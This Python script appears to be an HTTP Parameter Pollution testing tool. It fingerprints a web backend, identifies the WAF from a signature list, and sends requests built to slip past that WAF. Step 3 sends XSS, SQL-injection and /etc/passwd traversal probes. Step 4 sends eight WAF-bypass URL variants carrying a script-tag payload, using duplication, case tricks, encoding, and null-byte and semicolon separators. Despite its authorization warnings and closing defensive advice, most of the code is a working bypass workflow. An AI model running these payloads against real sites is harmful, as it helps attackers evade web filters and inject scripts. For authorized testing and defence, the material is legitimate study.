#!/usr/bin/env python3
"""
Practical HPP Testing Example
Demonstrates step-by-step testing methodology
"""

import requests
from urllib.parse import urlencode, parse_qs
import time
import random

class HPPPracticalTest:
    """Step-by-step HPP testing workflow"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        })
        
    def step1_fingerprint_backend(self):
        """
        STEP 1: Identify backend technology
        Look for server headers that reveal the platform
        """
        print("\n[STEP 1] Fingerprinting Backend Technology")
        print("=" * 60)
        
        try:
            resp = self.session.head(self.target_url, timeout=10)
            
            indicators = {
                'X-Powered-By': resp.headers.get('X-Powered-By', 'Not found'),
                'Server': resp.headers.get('Server', 'Not found'),
                'X-AspNet-Version': resp.headers.get('X-AspNet-Version', 'Not found'),
                'X-AspNetMvc-Version': resp.headers.get('X-AspNetMvc-Version', 'Not found'),
            }
            
            print("\nServer Headers:")
            for header, value in indicators.items():
                print(f"  {header}: {value}")
            
            # Determine technology
            if 'php' in indicators['X-Powered-By'].lower():
                technology = "PHP/Apache (uses LAST parameter)"
            elif indicators['X-AspNet-Version'] != 'Not found':
                technology = "ASP.NET/IIS (concatenates parameters)"
            elif 'apache-coyote' in indicators['Server'].lower():
                technology = "Tomcat/JSP (uses FIRST parameter)"
            else:
                technology = "Unknown - manual testing required"
            
            print(f"\n✓ Detected: {technology}")
            return technology
            
        except Exception as e:
            print(f"✗ Error: {str(e)}")
            return "Unknown"
    
    def step2_test_parameter_handling(self, param_name='test'):
        """
        STEP 2: Test how backend handles duplicate parameters
        Send test=FIRST&test=LAST and see which appears
        """
        print("\n[STEP 2] Testing Parameter Handling")
        print("=" * 60)
        
        test_url = f"{self.target_url}?{param_name}=FIRST&{param_name}=LAST"
        
        print(f"\nSending: {test_url}")
        
        try:
            resp = self.session.get(test_url, timeout=10)
            
            if 'FIRST' in resp.text and 'LAST' not in resp.text:
                result = "Uses FIRST occurrence (Tomcat/JSP behavior)"
            elif 'LAST' in resp.text and 'FIRST' not in resp.text:
                result = "Uses LAST occurrence (PHP/Python behavior)"
            elif 'FIRST,LAST' in resp.text or 'FIRST LAST' in resp.text:
                result = "Concatenates parameters (ASP.NET behavior)"
            elif 'FIRST' in resp.text and 'LAST' in resp.text:
                result = "Creates array (Node.js/Express behavior)"
            else:
                result = "Unclear - manual inspection required"
            
            print(f"\n✓ Result: {result}")
            print(f"  Status: {resp.status_code}")
            print(f"  Response length: {len(resp.text)} bytes")
            
            return result
            
        except Exception as e:
            print(f"✗ Error: {str(e)}")
            return "Error"
    
    def step3_identify_waf(self):
        """
        STEP 3: Identify WAF by sending obviously malicious payload
        """
        print("\n[STEP 3] WAF Identification")
        print("=" * 60)
        
        # Common WAF detection payloads
        test_payloads = [
            "<script>alert(1)</script>",
            "' OR '1'='1",
            "../../../etc/passwd",
        ]
        
        waf_signatures = {
            'cloudflare': ['cloudflare', 'cf-ray', 'attention required'],
            'modsecurity': ['mod_security', 'not acceptable', '406'],
            'aws': ['awselb', 'access denied', 'x-amzn'],
            'imperva': ['imperva', 'incapsula', '_incap_'],
            'akamai': ['akamai', 'reference', 'akam'],
            'f5': ['f5', 'bigip', 'x-cnection'],
        }
        
        detected_waf = None
        
        for payload in test_payloads:
            test_url = f"{self.target_url}?test={payload}"
            
            try:
                resp = self.session.get(test_url, timeout=10, allow_redirects=False)
                
                # Check status codes
                if resp.status_code in [403, 406, 419, 420, 429, 503]:
                    print(f"\n✓ WAF detected (Status: {resp.status_code})")
                    
                    # Check headers and body for WAF signatures
                    content = (str(resp.headers) + resp.text).lower()
                    
                    for waf, signatures in waf_signatures.items():
                        if any(sig in content for sig in signatures):
                            detected_waf = waf
                            print(f"  Identified: {waf.upper()} WAF")
                            break
                    
                    if detected_waf:
                        break
                else:
                    print(f"  Payload allowed (Status: {resp.status_code})")
                    
            except Exception as e:
                print(f"✗ Error with payload '{payload}': {str(e)}")
        
        if not detected_waf:
            print("\n⚠ No WAF detected or unknown WAF vendor")
            detected_waf = "unknown"
        
        return detected_waf
    
    def step4_test_hpp_bypasses(self, waf_type='unknown'):
        """
        STEP 4: Test HPP bypass techniques
        """
        print("\n[STEP 4] Testing HPP Bypass Techniques")
        print("=" * 60)
        
        # Test payload
        malicious = "<script>alert(1)</script>"
        param = "q"
        
        # Generate bypasses based on WAF type
        bypasses = [
            {
                'name': 'Basic Duplication (clean first, malicious last)',
                'url': f"{self.target_url}?{param}=safe&{param}={malicious}",
                'works_on': ['modsecurity', 'unknown']
            },
            {
                'name': 'Reverse Duplication (malicious first, clean last)',
                'url': f"{self.target_url}?{param}={malicious}&{param}=safe",
                'works_on': ['tomcat', 'unknown']
            },
            {
                'name': 'Array Notation',
                'url': f"{self.target_url}?{param}[]=safe&{param}[]={malicious}",
                'works_on': ['cloudflare', 'f5', 'unknown']
            },
            {
                'name': 'Case Variation',
                'url': f"{self.target_url}?{param}=safe&{param.upper()}={malicious}",
                'works_on': ['cloudflare', 'aws', 'unknown']
            },
            {
                'name': 'Encoding (second param)',
                'url': f"{self.target_url}?{param}=safe&{param}=%3Cscript%3Ealert(1)%3C/script%3E",
                'works_on': ['all']
            },
            {
                'name': 'Separator Confusion (semicolon)',
                'url': f"{self.target_url}?{param}=safe;{param}={malicious}",
                'works_on': ['imperva', 'unknown']
            },
            {
                'name': 'Null Byte Separator',
                'url': f"{self.target_url}?{param}=safe%00&{param}={malicious}",
                'works_on': ['imperva', 'unknown']
            },
            {
                'name': 'Sandwich Technique',
                'url': f"{self.target_url}?{param}=safe&{param}={malicious}&{param}=safe",
                'works_on': ['aws', 'akamai', 'unknown']
            },
        ]
        
        results = []
        
        for bypass in bypasses:
            # Skip if not relevant to detected WAF
            if waf_type not in bypass['works_on'] and 'all' not in bypass['works_on'] and waf_type != 'unknown':
                continue
            
            print(f"\n[TESTING] {bypass['name']}")
            print(f"  URL: {bypass['url']}")
            
            try:
                resp = self.session.get(bypass['url'], timeout=10)
                
                # Analyze response
                status = resp.status_code
                
                if status == 200:
                    # Check if payload was reflected/executed
                    if malicious.lower() in resp.text.lower():
                        result = "✓ POTENTIAL BYPASS - Payload reflected!"
                        success = True
                    else:
                        result = "⚠ Allowed but payload not reflected"
                        success = False
                elif status in [403, 406, 419, 420]:
                    result = f"✗ Blocked (Status: {status})"
                    success = False
                else:
                    result = f"? Unusual status: {status}"
                    success = False
                
                print(f"  {result}")
                
                results.append({
                    'technique': bypass['name'],
                    'status': status,
                    'success': success
                })
                
                # Rate limiting protection
                time.sleep(random.uniform(1, 3))
                
            except Exception as e:
                print(f"  ✗ Error: {str(e)}")
                results.append({
                    'technique': bypass['name'],
                    'status': 'error',
                    'success': False
                })
        
        return results
    
    def step5_analyze_results(self, results):
        """
        STEP 5: Analyze results and provide recommendations
        """
        print("\n[STEP 5] Analysis & Recommendations")
        print("=" * 60)
        
        successful = [r for r in results if r.get('success', False)]
        
        if successful:
            print(f"\n⚠ VULNERABILITIES FOUND: {len(successful)}")
            print("\nSuccessful Bypass Techniques:")
            for r in successful:
                print(f"  • {r['technique']}")
            
            print("\n[RECOMMENDATIONS]")
            print("1. Reject requests with duplicate parameter names")
            print("2. Normalize parameters BEFORE security checks")
            print("3. Validate ALL parameter occurrences")
            print("4. Ensure WAF and backend parse identically")
            print("5. Implement strict parameter allowlists")
        else:
            print("\n✓ No HPP bypasses found in this test")
            print("  Application appears properly hardened")
        
        return successful
    
    def run_full_test(self):
        """
        Execute complete HPP testing workflow
        """
        print("\n" + "=" * 60)
        print("HTTP PARAMETER POLLUTION (HPP) TESTING WORKFLOW")
        print("=" * 60)
        print(f"\nTarget: {self.target_url}")
        print("\n⚠ AUTHORIZATION REQUIRED - Ensure you have permission to test")
        
        # Step 1: Fingerprint
        technology = self.step1_fingerprint_backend()
        
        # Step 2: Parameter handling
        handling = self.step2_test_parameter_handling()
        
        # Step 3: WAF detection
        waf = self.step3_identify_waf()
        
        # Step 4: Test bypasses
        results = self.step4_test_hpp_bypasses(waf)
        
        # Step 5: Analysis
        successful = self.step5_analyze_results(results)
        
        print("\n" + "=" * 60)
        print("TEST COMPLETE")
        print("=" * 60)
        
        return {
            'technology': technology,
            'handling': handling,
            'waf': waf,
            'results': results,
            'successful_bypasses': successful
        }


def main():
    """
    Example usage - DEMONSTRATION ONLY
    Replace with your authorized test target
    """
    
    print("""
╔════════════════════════════════════════════════════════════╗
║  HTTP PARAMETER POLLUTION (HPP) TESTING TOOL              ║
║  For Authorized Security Testing Only                     ║
╚════════════════════════════════════════════════════════════╝
    """)
    
    # DEMO - Replace with actual authorized target
    target = "http://testsite.local/search"
    
    print("\n⚠ IMPORTANT: Only test systems you are authorized to test!")
    print(f"\nConfigured target: {target}")
    print("\nThis is a demonstration. To test a real target:")
    print("1. Obtain written authorization")
    print("2. Update the 'target' variable")
    print("3. Run the test")
    print("\nPress Ctrl+C to exit\n")
    
    # Uncomment to run actual test (AUTHORIZED TARGETS ONLY)
    # tester = HPPPracticalTest(target)
    # report = tester.run_full_test()
    
    # For demo purposes, show what would be tested
    print("\n[DEMO MODE] Techniques that would be tested:")
    techniques = [
        "1. Basic parameter duplication",
        "2. Array notation (param[])",
        "3. Case variation (param vs PARAM)",
        "4. URL encoding on duplicate",
        "5. Separator confusion (semicolon, null byte)",
        "6. Sandwich technique (clean-malicious-clean)",
    ]
    
    for tech in techniques:
        print(f"  {tech}")
    
    print("\n✓ Demo complete. Authorize and configure target to run real tests.")


if __name__ == "__main__":
    main()
